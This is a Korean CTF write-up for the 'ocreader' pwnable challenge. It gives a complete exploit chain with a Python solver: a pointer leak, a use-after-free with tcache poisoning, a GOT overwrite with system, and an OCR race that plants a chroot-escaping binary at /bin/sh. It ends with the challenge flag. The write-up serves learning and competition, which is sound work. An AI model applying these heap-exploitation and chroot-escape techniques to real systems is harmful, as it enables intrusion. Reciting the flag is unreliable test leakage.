---
title: "HyperSonic CTF 2026 ocreader Writeup"
published: 2026-06-08
description: "HyperSonic CTF 2026 ocreader 문제 풀이."
category: "CTF/Wargame"
tags: ["HyperSonic CTF", "CTF", "Writeup", "Pwnable"]
draft: false
listed: false
---

# ocreader

## 개요

`ocreader`는 이미지를 업로드한 뒤 OCR 결과를 VM 명령으로 실행하는 pwnable 문제입니다. 프로그램은 최대 `4`개의 이미지 슬롯을 관리하고, 각 이미지에는 `title`, `description`, `path`가 연결됩니다. OCR로 추출된 각 줄은 VM의 `vm_execute_line`에 전달됩니다.

확인한 조건은 다음과 같습니다.

- 카테고리: `pwnable`
- 목표: OCR 이미지 관리 기능과 VM 명령 처리 흐름을 이용해 flag를 읽습니다.
- 주요 기능: 이미지 저장, OCR 실행, 정보 출력, title 수정, title 삭제

풀이에서 먼저 확인할 부분은 이미지 슬롯 구조와 VM 명령 처리 방식입니다. 메뉴 쪽에서는 heap 객체를 조작할 수 있고, VM 쪽에서는 OCR 결과가 파일 시스템 명령으로 이어집니다. 두 흐름을 연결하면 GOT를 덮은 뒤 `system`을 호출할 수 있습니다.

## 문제 분석

먼저 글에서 사용할 구조와 용어를 정리합니다.

- `image`: 프로그램이 관리하는 이미지 슬롯 객체입니다.
- `title`: `malloc(0x20)`으로 할당되며, 사용자가 입력한 `32`바이트가 저장됩니다.
- `description`: VM의 `ADDDESC` 명령으로 만들어지는 설명 버퍼입니다.
- `path`: 업로드된 이미지 파일 경로입니다. VM의 `RENAME` 명령이 참조합니다.
- `OCR 캐시`: OCR 결과를 저장해 두는 텍스트 파일입니다. 이미 존재하면 Tesseract를 다시 실행하지 않고 캐시를 읽습니다.
- `blacklist`: Tesseract 실행 시 `tessedit_char_blacklist`에 전달되는 전역 문자열입니다.

이미지 슬롯은 다음 구조체처럼 해석할 수 있습니다.

```c
struct image {
    char *title;
    char *description;
    char *path;
};
```

`show info`는 `title`과 `description`을 `puts`로 출력합니다. 특히 `description`은 버퍼의 시작 주소가 아니라 `description + 8`을 출력합니다. `ADDDESC`를 빈 인자로 실행하면 `description + 8` 위치에 VM handler 라이브러리 내부 포인터가 저장됩니다. 그 결과 `show info`에서 해당 포인터의 하위 바이트가 그대로 새어 나옵니다.

```text
empty ADDDESC:
  *(description + 0x00) = 0
  *(description + 0x08) = lib_base + 0x40c0

show info:
  puts(description + 0x08)
```

첫 번째 leak 값은 다음처럼 계산할 수 있습니다.

```text
lib_base = leaked_description_pointer - 0x40c0
```

VM handler 라이브러리의 명령 테이블에는 다음 네 가지 opcode가 있습니다.

```text
RENAME
MKDIR
BLACKLIST
ADDDESC
```

`vm_execute_line`은 OCR 한 줄에서 첫 공백 앞을 opcode로 보고, 테이블의 opcode 문자열과 `strcmp`로 비교한 뒤 일치하는 handler를 호출합니다.

```text
for each vm_opcode:
    if strcmp(command, vm_opcode) == 0:
        handler(context, image_index, argument)
```

여기서 `strcmp@GOT`는 VM handler 라이브러리의 쓰기 가능한 영역에 남아 있습니다. 재배치 정보에서 `puts@GOT`와 `strcmp@GOT`의 오프셋은 다음과 같이 확인됩니다.

```text
puts@GOT   = lib_base + 0x4010
strcmp@GOT = lib_base + 0x4040
```

즉 `strcmp@GOT`를 `system`으로 바꾸면, opcode 비교 지점에서 다음 호출이 일어납니다.

```text
strcmp(command, vm_opcode)  ->  system(command)
```

다만 프로그램은 chroot 안에서 동작합니다. `system`은 내부적으로 `/bin/sh -c <command>`를 실행하므로, chroot 내부의 `/bin/sh`를 먼저 준비해야 합니다.

## 핵심 아이디어

풀이의 큰 흐름은 두 단계로 나눌 수 있습니다.

첫 번째는 메뉴 기능에서 임의 주소 쓰기에 가까운 primitive를 만드는 단계입니다. `delete title`은 `free(image->title)`을 호출하지만 포인터를 지우지 않습니다. 이후 `edit title`은 해당 포인터가 이미 해제되었는지 검사하지 않고 `32`바이트를 다시 씁니다. 이 때문에 해제된 `title` chunk의 tcache `fd`를 수정할 수 있습니다.

두 번째는 OCR/VM 경로에서 chroot 내부의 `/bin/sh`를 준비하는 단계입니다. VM의 `BLACKLIST` 명령은 전역 OCR blacklist를 바꿉니다. 빈 인자로 실행하면 blacklist가 잠시 비어 있다가 약 `25`밀리초 뒤 기본값인 `RNM`으로 돌아갑니다. 이 짧은 구간에 다른 이미지의 첫 OCR을 성공시키면 `RENAME`과 `MKDIR`이 정상적으로 인식됩니다.

정리하면 공격에 필요한 primitive는 다음과 같습니다.

```text
1. ADDDESC로 VM handler 라이브러리 base 주소 leak
2. title UAF로 tcache fd poisoning
3. forged image 슬롯을 만들어 puts@GOT leak
4. OCR race로 업로드한 정적 실행 파일을 chroot 내부 /bin/sh에 배치
5. strcmp@GOT를 system으로 덮고 VM opcode 비교 지점에서 system 호출
```

순서도 중요합니다. `strcmp@GOT`를 너무 일찍 덮으면 VM이 `BLACKLIST`, `MKDIR`, `RENAME`을 정상 handler로 처리하지 못합니다. 따라서 `/bin/sh` 배치 race를 먼저 끝낸 뒤 마지막에 GOT를 덮어야 합니다.

## 풀이 과정

### Step 1. `ADDDESC`로 VM handler 라이브러리 base 주소 leak

먼저 OCR 결과가 다음 두 줄을 포함하는 이미지를 업로드합니다.

```text
BLACKLIST
ADDDESC
```

이 이미지를 OCR하면 `ADDDESC`가 빈 인자로 실행됩니다. 앞서 본 것처럼 빈 `ADDDESC`는 `description + 8` 위치에 라이브러리 내부 포인터를 저장합니다. 이후 `show info`를 호출하면 이 포인터가 출력됩니다.

```text
lib_base = leak - 0x40c0
```

이 값으로 VM handler 라이브러리의 GOT 주소를 계산할 수 있습니다.

```text
puts_got   = lib_base + 0x4010
strcmp_got = lib_base + 0x4040
```

이 단계의 OCR 결과는 캐시에도 남습니다. 나중에 `strcmp@GOT`를 덮은 뒤 다시 OCR을 실행할 때 Tesseract를 다시 실행하지 않고, 캐시된 `BLACKLIST` 줄을 빠르게 VM에 전달할 수 있습니다.

### Step 2. title UAF로 `image` 슬롯 위조

`delete title`은 `title` 포인터를 해제하지만 슬롯 내부 포인터를 `NULL`로 바꾸지 않습니다. 따라서 같은 슬롯에 대해 `show info`를 호출하면 해제된 chunk의 내용을 `puts`로 읽을 수 있고, `edit title`을 호출하면 해제된 chunk에 다시 쓸 수 있습니다.

두 개의 `title`을 연속으로 해제하면 `0x30` tcache bin에 들어갑니다. 두 번째로 해제한 `title`을 출력하면 safe-linking이 적용된 `fd`가 leak됩니다. 확인한 heap 배치에서는 두 번째 `title`이 첫 번째 `title`보다 `0x80`바이트 뒤에 있으므로 다음 관계를 이용해 첫 번째 `title` 주소를 복구할 수 있습니다.

```text
encoded_fd = title0 ^ (title1 >> 12)
title1     = title0 + 0x80
```

반복 계산으로 `title0`을 얻은 뒤, 확인한 레이아웃에 맞춰 네 번째 이미지 슬롯 구조체의 주소를 계산합니다.

```text
image3 = title0 - 0x250
poison = image3 ^ (title1 >> 12)
```

`edit title`로 해제된 `title1` chunk의 `fd`를 `poison` 값으로 바꾸면, 이후 `malloc(0x20)`이 네 번째 이미지 슬롯 구조체와 겹치는 주소를 반환합니다. 이때 `title` 입력으로 아래 구조를 써서 이미지 슬롯 자체를 위조합니다.

```python
fake_image3 = (
    p64(lib_base + 0x4040)      # title -> strcmp@GOT
    + p64(lib_base + 0x4010 - 8)  # description -> puts@GOT - 8
    + p64(0)                   # path
    + p64(0x51)                # following heap metadata
)
```

`description`을 `puts@GOT - 8`로 둔 이유는 `show info`가 먼저 `description`을 역참조한 뒤 `description + 8`을 출력하기 때문입니다. 이렇게 맞추면 `description + 8`이 정확히 `puts@GOT`가 됩니다.

### Step 3. `puts@GOT`로 libc base 계산

위조된 네 번째 슬롯에 대해 `show info`를 호출하면 `puts@GOT`에 저장된 libc 주소가 출력됩니다.

```text
libc_base = leaked_puts - 0x87be0
system    = libc_base + 0x58750
```

이제 네 번째 슬롯의 `title`은 `strcmp@GOT`를 가리키고 있습니다. 따라서 `edit title`을 호출하면 `strcmp@GOT`에 원하는 값을 쓸 수 있습니다. 하지만 이 시점에서는 아직 `system`을 쓰지 않습니다. VM의 정상 opcode handler가 한 번 더 필요하기 때문입니다.

### Step 4. OCR race로 chroot 내부 `/bin/sh` 준비

프로그램은 chroot 환경에서 실행됩니다. `system`을 호출해도 chroot 내부에 사용할 수 있는 `/bin/sh`가 없으면 flag를 읽기 어렵습니다. 그래서 별도의 정적 실행 파일을 업로드한 뒤 VM 명령으로 chroot 내부의 `/bin/sh` 위치로 옮깁니다.

정적 실행 파일의 역할은 단순합니다.

```text
1. 임시 디렉터리를 만들고 그 안으로 chroot한다.
2. 상위 디렉터리로 여러 번 이동한다.
3. 현재 위치를 다시 chroot의 루트로 만든다.
4. 여러 flag 후보 경로를 순서대로 읽는다.
```

파일을 `/bin/sh`로 옮기기 위해 필요한 OCR 문장은 다음과 같습니다.

```text
MKDIR ../bin
RENAME 2 ../bin/sh
```

문제는 기본 OCR blacklist가 `RNM`이라는 점입니다. 이 상태에서 위 문장을 OCR하면 `R`, `N`, `M`이 빠져 opcode가 깨질 수 있고, 잘못된 OCR 결과가 캐시에 남으면 이후 재시도도 실패합니다.

그래서 `BLACKLIST`가 빈 인자로 실행되는 순간을 이용합니다. 이 명령은 전역 blacklist를 비운 뒤 약 `25`밀리초 동안 유지하고, 이후 다시 `RNM`으로 복구합니다. 한 번의 타이밍에 의존하면 불안정하므로 캐시된 `BLACKLIST` 이미지를 여러 번 실행하면서 두 번째 이미지의 첫 OCR도 여러 번 요청했습니다.

```text
캐시된 BLACKLIST OCR 32회 요청
두 번째 이미지 OCR 64회 요청
```

성공하면 VM의 `MKDIR` handler가 chroot 내부에 `/bin`을 만들고, `RENAME` handler가 업로드된 정적 실행 파일을 `/bin/sh` 위치로 옮깁니다. 이 단계가 끝난 뒤에야 `strcmp@GOT`를 덮을 수 있습니다.

### Step 5. `strcmp@GOT` 덮어쓰기 후 VM opcode 비교 지점 트리거

마지막으로 네 번째 슬롯의 `title`을 수정합니다. 해당 포인터는 이미 `strcmp@GOT`를 가리키므로, 입력한 `system` 주소가 그대로 GOT에 써집니다.

그 다음 캐시된 OCR 이미지를 한 번 더 실행합니다. `vm_execute_line`은 opcode 비교를 위해 `strcmp(command, vm_opcode)`를 호출해야 하지만, GOT가 바뀌었기 때문에 실제 호출은 `system(command)`가 됩니다.

```text
command = "BLACKLIST"
system("BLACKLIST")
```

`system`은 `/bin/sh -c BLACKLIST`를 실행합니다. 앞 단계에서 chroot 내부의 `/bin/sh`를 정적 실행 파일로 바꿔 두었으므로, 이 실행 파일이 동작하면서 chroot를 벗어나 flag 후보 경로를 읽습니다.

## Exploit / Solver

최종 exploit은 leak 값으로 base 주소를 계산하고, tcache poisoning으로 네 번째 이미지 슬롯을 위조한 뒤, OCR race와 GOT 덮어쓰기를 순서대로 실행합니다. 아래 코드는 연결과 메뉴 동기화 부분을 제외한 핵심 흐름입니다. `c`는 이미지 저장, OCR 실행, 정보 출력, title 수정, title 삭제를 수행하는 클라이언트 객체라고 두겠습니다.

```python
import re
import struct
import time


LIB_DESC_PTR_OFF = 0x40C0
LIB_PUTS_GOT = 0x4010
LIB_STRCMP_GOT = 0x4040

LIBC_PUTS = 0x87BE0
LIBC_SYSTEM = 0x58750


def p64(x):
    return struct.pack("<Q", x)


def u64(data):
    return struct.unpack("<Q", data[:8].ljust(8, b"\x00"))[0]


def leak_after(out, marker, n=6):
    pos = out.index(marker) + len(marker)
    return u64(out[pos:pos + n])


def decode_title0(encoded):
    title0 = encoded
    for _ in range(8):
        title0 = encoded ^ ((title0 + 0x80) >> 12)
    return title0


def pipeline_ocr(c, idx, count):
    if not c.at_prompt:
        c.recvuntil(b"> ")
    c.send((f"2\n{idx}\n" * count).encode())
    c.at_prompt = False


def race_make_bin_sh(c):
    pipeline_ocr(c, 0, 32)
    pipeline_ocr(c, 1, 64)
    time.sleep(2.0)

    out = c.recv_some(timeout=0.5)
    c.at_prompt = True
    if b"image renamed" not in out:
        raise RuntimeError("OCR race failed")


def exploit(c, boot_png, stage_png, escape_elf):
    escape_elf += b"\x00"
    assert len(escape_elf) % 3 == 0

    c.store_image(boot_png, b"A" * 32)
    c.store_image(stage_png, b"B" * 32)

    c.ocr_image(0)
    c.wait_prompt(timeout=5.0)
    time.sleep(1.0)
    c.recv_some(timeout=0.2)
    c.at_prompt = True

    info0 = c.show_info(0)
    lib_base = leak_after(info0, b"description: ") - LIB_DESC_PTR_OFF

    c.delete_title(0)
    c.delete_title(1)

    info1 = c.show_info(1)
    encoded_fd = leak_after(info1, b"title: ")
    title0 = decode_title0(encoded_fd)
    title1 = title0 + 0x80
    image3 = title0 - 0x250

    c.edit_title(1, p64(image3 ^ (title1 >> 12)))

    c.store_image(escape_elf, b"C" * 32)

    fake_image3 = (
        p64(lib_base + LIB_STRCMP_GOT)
        + p64(lib_base + LIB_PUTS_GOT - 8)
        + p64(0)
        + p64(0x51)
    )
    c.store_image(b"ABC", fake_image3)

    info3 = c.show_info(3)
    libc_base = leak_after(info3, b"description: ") - LIBC_PUTS
    system = libc_base + LIBC_SYSTEM

    race_make_bin_sh(c)

    c.edit_title(3, p64(system))

    pipeline_ocr(c, 0, 1)
    time.sleep(1.0)
    out = c.recv_some(timeout=2.0)
    return re.search(rb"(?:flag|Hypersonic)\{[^}\r\n]+\}", out).group(0)
```

한 가지 주의할 점은 Base64 디코더입니다. 업로드 데이터 길이가 `3`의 배수가 아니면 `=` padding이 들어가고, 제공된 디코더가 이를 안정적으로 처리하지 못했습니다. 그래서 정적 실행 파일 뒤에 NUL 바이트를 붙여 길이를 맞췄습니다.

## 결과

원격 실행에서 flag를 확인했습니다.

```text
Hypersonic{0cr_n3v3r_d13_1n_chr00t}
```
